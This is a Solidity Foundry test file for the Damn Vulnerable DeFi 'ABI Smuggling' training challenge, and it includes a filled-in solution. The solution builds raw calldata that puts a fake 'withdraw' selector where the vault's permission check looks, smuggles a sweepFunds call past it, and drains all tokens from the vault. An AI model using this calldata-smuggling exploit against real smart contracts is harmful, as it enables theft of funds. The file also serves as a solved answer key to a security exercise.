// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // 1. Prepare data for the real action (sweepFunds)
        bytes memory sweepData = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            address(token)
        );

        // 2. Construct the malicious calldata
        //
        // Structure we want:
        // 0x00: execute selector
        // 0x04: target address (vault)
        // 0x24: offset of actionData (pointer)
        // ... (padding to reach offset 0x64) ...
        // 0x64: FAKE selector (withdraw) - Checked by authorized executor
        // ... (more padding/structure to reach actionData start) ...
        // 0x84: length of actionData
        // 0xA4: actual actionData (sweepFunds)

        // Calculate offset:
        // Standard offset is 0x40 (64 bytes from start of args).
        // We want to insert 32 bytes (padding) + 32 bytes (fake selector) before the length.
        // So offset = 0x40 + 0x40 = 0x80 (128).
        
        bytes memory payload = abi.encodePacked(
            vault.execute.selector,                         // 0x00
            bytes32(uint256(uint160(address(vault)))),      // 0x04: Target
            bytes32(uint256(0x80)),                         // 0x24: Offset to actionData (128)
            bytes32(0),                                     // 0x44: Padding
            bytes32(abi.encodePacked(vault.withdraw.selector, bytes28(0))), // 0x64: Fake Selector (withdraw)
            bytes32(uint256(sweepData.length)),             // 0x84: Length of actionData
            sweepData                                       // 0xA4: Actual data (sweepFunds)
        );

        // 3. Execute the exploit
        (bool success, ) = address(vault).call(payload);
        require(success, "Exploit failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
